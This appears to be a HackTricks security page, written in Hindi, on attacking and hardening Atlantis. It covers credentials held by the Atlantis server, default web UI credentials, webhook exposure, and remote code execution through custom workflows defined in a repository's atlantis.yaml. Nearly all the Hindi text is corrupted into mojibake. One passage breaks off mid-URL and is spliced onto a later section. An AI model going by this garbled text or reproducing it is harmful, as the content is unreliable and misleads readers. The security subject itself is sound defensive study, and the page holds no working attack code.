# рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕реБрд░рдХреНрд╖рд╛

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЖрдо рддреМрд░ рдкрд░ рдЖрдкрдХреЛ рдЖрдкрдХреЗ рдЧрд┐рдЯ рд╕рд░реНрд╡рд░ рд╕реЗ рдкреБрд▓ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯреНрд╕ рд╕реЗ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЪрд▓рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

![](<../.gitbook/assets/image (161).png>)

## рд╕реНрдерд╛рдиреАрдп рд▓реИрдм

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) рдкрд░ **рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд░рд┐рд▓реАрдЬрд╝ рдкреЗрдЬ** рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред
2. рдЕрдкрдиреЗ **рдЧрд┐рдЯрд╣рдм** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЯреЛрдХрди** (рд░реЗрдкреЛ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде) рдмрдирд╛рдПрдВ
3. `./atlantis testdrive` рдЪрд▓рд╛рдПрдВ рдФрд░ рдпрд╣ рдПрдХ **рдбреЗрдореЛ рд░реЗрдкреЛ** рдмрдирд╛рдПрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдЖрдк рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕реЗ рдмрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
4. рдЖрдк 127.0.0.1:4141 рдореЗрдВ рд╡реЗрдм рдкреЗрдЬ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ

## рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдПрдХреНрд╕реЗрд╕

### рдЧрд┐рдЯ рд╕рд░реНрд╡рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

**рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕** рдХрдИ рдЧрд┐рдЯ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ **рдЧрд┐рдЯрд╣рдм**, **рдЧрд┐рдЯрд▓реИрдм**, **рдмрд┐рдЯрдмрдХреЗрдЯ** рдФрд░ **рдПрдЬрд╝реНрдпреВрд░ рдбреЗрд╡рдСрдкреНрд╕**ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рдореЗрдВ рд░реЗрдкреЛ рдореЗрдВ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрдиреНрд╣реЗрдВ рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкрд╣реБрдВрдЪ рджрд┐рдП рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** (рдХрдо рд╕реЗ рдХрдо рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ)ред\
[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) рдЗрди рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореЛрдВ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдиреЗ рдХреА рдкреНрд░реЛрддреНрд╕рд╛рд╣рдирд╛ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдХреБрдЫ рд▓реЛрдЧ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="warning" %}
рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдХреА рджреГрд╖реНрдЯрд┐ рд╕реЗ, **рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЦрд╛рддрд╛** рдмрд╣реБрдд **рд░реЛрдЪрдХ** рд╣реЛрдЧрд╛ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
{% endhint %}

### рд╡реЗрдмрд╣реБрдХреНрд╕

рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ [**рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рдЧрд┐рдЯ рд╣реЛрд╕реНрдЯ рд╕реЗ рдкреНрд░рд╛рдкреНрдд **рд╡реЗрдмрд╣реБрдХреНрд╕** рдХреЛ **рд╡реИрдз** рдорд╛рди рд╕рдХреЗред

рдЗрд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдЖрдк рдЕрдкрдиреЗ рдЧрд┐рдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рдЖрдИрдкреА рд╕реЗ рдХреЗрд╡рд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдВ** рд▓реЗрдХрд┐рди рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ рд╡реЗрдмрд╣реБрдХ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдирд┐рдЬреА рдЧрд┐рдЯрд╣рдм рдпрд╛ рдмрд┐рдЯрдмрдХреЗрдЯ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рд╡реЗрдмрд╣реБрдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% hint style="warning" %}
рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ **рд╡реЗрдмрд╣реБрдХреНрд╕ рдХреЛ рдЙрдЬрд╛рдЧрд░** рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдЧрд┐рдЯ рд╕рд░реНрд╡рд░ рдЙрд╕реЗ рд╕реВрдЪрдирд╛рдПрдВ рднреЗрдЬ рд╕рдХреЗред рд╣рдорд▓рд╛рд╡рд░ рдХреА рджреГрд╖реНрдЯрд┐ рд╕реЗ рдпрд╣ рд░реЛрдЪрдХ рд╣реЛрдЧрд╛ рдЬрд╛рдирдирд╛ **рдХрд┐ рдХреНрдпрд╛ рдЖрдк рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ <a href="#provider-credentials" id="provider-credentials"></a>

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://www.runatlantis.io/docs/provider-credentials.html)

рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЪрд▓рд╛рддрд╛ рд╣реИ рдмрд╕ `terraform plan` рдФрд░ `apply` рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд╕рд░реНрд╡рд░ рдкрд░ **рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЬрд┐рд╕ рддрд░рд╣ рд╕реЗ рдЬрдм рдЖрдк рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдЪрд▓рд╛рддреЗ рд╣реИрдВ, рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЛ рдЖрдкрдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдпрд╣ рдЖрдк рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк [рдЕрдкрдиреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рджрд╛рди рдХреИрд╕реЗ рдХрд░рддреЗ рд╣реИрдВ](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЗ рд▓рд┐рдП:

* рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ [рд╣реЗрд▓реНрдо рдЪрд╛рд░реНрдЯ](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) рдФрд░ [AWS рдлрд╛рд░рдЧреЗрдЯ рдореЙрдбреНрдпреВрд▓](https://www.runatlantis.io/docs/deployment.html#aws-fargate) рдХреЗ рд▓рд┐рдП рдЙрдирдХреЗ рдЦреБрдж рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВ рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рд▓рд┐рдПред рдЙрдирдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрдврд╝реЗрдВред
* рдпрджрд┐ рдЖрдк рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдХреЛ рдПрдХ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдХрдИ рдХреНрд▓рд╛рдЙрдбреНрд╕ рдХреЗ рдкрд╛рд╕ рдЙрди рдкрд░ рдЪрд▓ рд░рд╣реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдХреНрд▓рд╛рдЙрдб рдПрдкреАрдЖрдИ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ:
* [AWS EC2 рд░реЛрд▓реНрд╕](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (рдЦреЛрдЬреЗрдВ "EC2 рд░реЛрд▓")
* [GCE рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯреНрд╕](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* рдмрд╣реБрдд рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдирд┐рд░реНрдорд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ `AWS_ACCESS_KEY`, рдЬрд╣рд╛рдВ рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* рдЕрдиреНрдп рд▓реЛрдЧ рдЖрд╡рд╢реНрдпрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ `~/.aws/credentials`, рдЬрд╣рд╛рдВ рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЪрд▓ рд░рд╣рд╛ рд╣реИред
* рдкреНрд░рджрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

{% hint style="warning" %}
**рдХрдВрдЯреЗрдирд░** рдЬрд╣рд╛рдВ **рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕** **рдЪрд▓ рд░рд╣рд╛ рд╣реИ** рдЙрд╕рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рджрд╛рддрд╛рдУрдВ (AWS, GCP, рдЧрд┐рдЯрд╣рдм...) рдХреЗ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реЛрдВрдЧреЗред
{% endhint %}

### рд╡реЗрдм рдкреЗрдЬ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рдореЗрдВ рдкреЛрд░реНрдЯ 4141 рдореЗрдВ рдПрдХ **рд╡реЗрдм рдкреЗрдЬ рдЪрд▓рд╛рдПрдЧрд╛**ред рдпрд╣ рдкреЗрдЬ рдЖрдкрдХреЛ рдЕрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдПрдкреНрд▓рд╛рдИ рдХреЛ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ рд░реЗрдкреЛ рдХреА рдкреНрд▓рд╛рди рд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЗрд╕рд╕реЗ рдЪреАрдЬреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЗрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)ред

рдЖрдк рд╢рд╛рдпрдж рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЗрд╕реЗ рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреЛрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ** (рдФрд░ рдпрджрд┐ рд╣реИрдВ рддреЛ `atlantis`:`atlantis` **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╣реЛрддреЗ рд╣реИрдВ)ред

## рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди

`atlantis server` рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдлреНрд▓реИрдЧреНрд╕, рдПрдирд╡рд╛рдпрд░рдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕, рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рддреАрдиреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* рдЖрдк [**рдпрд╣рд╛рдБ рдлреНрд▓реИрдЧреНрд╕ рдХреА рд╕реВрдЪреА**](https://www.runatlantis.io
#### рдкреАрдЖрд░ рд╕реБрд░рдХреНрд╖рд╛

рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рдЕрдиреНрдп рдХрд┐рд╕реА рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ **`рдордВрдЬреВрд░`** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (рдпрджрд┐ рдпрд╣ рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╕реЗрдЯ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИ) рдФрд░/рдпрд╛ **`рдорд░реНрдЬрдпреЛрдЧреНрдп`** (рд╢рд╛рдЦрд╛ рд╕реБрд░рдХреНрд╖рд╛ рдкрд╛рд░рд┐рдд) рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП **рдПрдкреНрд▓рд╛рдИ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ**. рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдк рд╕реЗрдЯ рдХрд░рдирд╛ рдПрдХ рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╣реИред

рдпрджрд┐ `allowed_overrides` рд╕рддреНрдп рд╣реИ, рддреЛ рдЗрди рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ `/atlantis.yml` рдлрд╝рд╛рдЗрд▓ рджреНрд╡рд╛рд░рд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

#### рд╕реНрдХреНрд░рд┐рдкреНрдЯ

рд░реЗрдкреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ [**рдкрд╣рд▓реЗ**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_рдкреВрд░реНрд╡-рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐ рд╣реБрдХреНрд╕_) рдФрд░ [**рдмрд╛рдж**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_рдкреЛрд╕реНрдЯ-рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐ рд╣реБрдХреНрд╕_) **рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐** рдХреЗ **рдкрд╣рд▓реЗ** рдФрд░ **рдмрд╛рдж** **рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ**ред

рд░реЗрдкреЛ `/atlantis.yml` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА** рдХреЛрдИ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИред

#### рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐

рд░реЗрдкреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧ (рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ) рдореЗрдВ рдЖрдк [**рдирдпрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), рдпрд╛ [**рдирдП рдХрд╕реНрдЯрдо рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐рдпрд╛рдБ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**ред** рдЖрдк рднреА **рдирд┐рд░реНрдорд┐рдд** рд╣реБрдП **рдирдП** рдХреЛ **рдкрд╣реБрдВрдЪрдиреЗ** рд╡рд╛рд▓реЗ **рд░реЗрдкреЛ** рдХреЛ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдлрд┐рд░, рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреЗ **atlantis.yaml** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="danger" %}
рдпрджрд┐ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧ**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) рдЭрдВрдбрд╛ `allow_custom_workflows` рдХреЛ **рд╕рддреНрдп** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐рдпрд╛рдБ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ рдХреА **`atlantis.yaml`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдирд┐рд░реНрджрд┐рд╖реНрдЯ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдпрд╣ рднреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ **`allowed_overrides`** рднреА **`рдХрд╛рд░реНрдпрдкреНрд░рд╡реГрддреНрддрд┐`** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗ** рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ рд╕рд░реНрд╡рд░ рдореЗрдВ RCE рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджреЗрдЧрд╛ рдЬреЛ рдЙрд╕ рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ**ред
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest рдиреАрддрд┐ рдЬрд╛рдВрдЪ

рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕ **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб** [**conftest**](https://www.conftest.dev/) **рдиреАрддрд┐рдпреЛрдВ** рдХреЛ рдкреНрд▓рд╛рди рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╕реНрдЯреЗрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдорд▓реЗ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдореЙрдбреНрдпреВрд▓ рдХреА рд╕реВрдЪреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдХрд╛рд░рдирд╛
* рд╕рдВрд╕рд╛рдзрди рдХреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдирд╛ рдирд┐рд░реНрдорд╛рдг рд╕рдордп рдкрд░
* рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╕рдВрд╕рд╛рдзрди рд╣рдЯрд╛рдиреЗ рдХреЛ рдкрдХрдбрд╝рдирд╛
* рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рд░реЛрдХрдирд╛ (рдЬреИрд╕реЗ рдХрд┐ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХрд░рдирд╛)

